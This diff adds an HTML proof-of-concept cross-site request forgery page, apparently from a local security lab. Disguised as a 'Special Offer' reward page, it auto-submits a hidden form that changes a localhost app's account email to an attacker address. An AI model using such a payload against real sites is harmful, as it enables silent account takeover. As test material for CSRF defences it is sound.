@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Special Offer</title>
+</head>
+
+<body>
+
+<h2>Special Offer!</h2>
+<p>Loading your reward...</p>
+
+<form id="csrfForm" action="http://127.0.0.1:8000/change-email-safe/" method="POST">
+    <input type="hidden" name="email" value="attacker@email.com">
+</form>
+
+<script>
+setTimeout(function() {
+    document.getElementById("csrfForm").submit();
+}, 2000);
+</script>
+
+</body>
+</html>
